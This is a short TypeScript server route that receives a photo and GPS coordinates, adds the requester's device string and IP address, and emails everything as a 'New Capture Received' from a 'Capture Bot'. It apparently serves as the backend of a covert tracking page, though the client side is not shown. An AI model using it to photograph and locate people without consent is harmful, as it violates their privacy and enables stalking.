import nodemailer from "nodemailer";

export async function POST(req: Request) {
  try {
    const { image, lat, lon } = await req.json();

    if (!image || !lat || !lon) {
      return new Response(
        JSON.stringify({ error: "Missing data" }),
        { status: 400 }
      );
    }

    // ── Extract device info (User-Agent)
    const userAgent =
      req.headers.get("user-agent") || "Unknown device";

    // ── Extract IP address (Vercel-safe)
    const forwardedFor =
      req.headers.get("x-forwarded-for") || "";
    const ip =
      forwardedFor.split(",")[0].trim() || "Unknown IP";

    // ── Remove base64 header
    const base64Data = image.replace(
      /^data:image\/jpeg;base64,/,
      ""
    );

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.MAIL_USER,
        pass: process.env.MAIL_PASS
      }
    });

    await transporter.sendMail({
      from: `"Capture Bot" <${process.env.MAIL_USER}>`,
      to: [
        process.env.MAIL_TO_1!
      ],
      subject: "New Capture Received",
      text: `
New capture received

Location:
Latitude: ${lat}
Longitude: ${lon}

Device Info:
${userAgent}

IP Address:
${ip}
      `.trim(),
      attachments: [
        {
          filename: "capture.jpg",
          content: base64Data,
          encoding: "base64"
        }
      ]
    });

    return new Response(
      JSON.stringify({ success: true }),
      { status: 200 }
    );

  } catch (err) {
    console.error("Send error:", err);

    return new Response(
      JSON.stringify({ error: "Server error" }),
      { status: 500 }
    );
  }
}
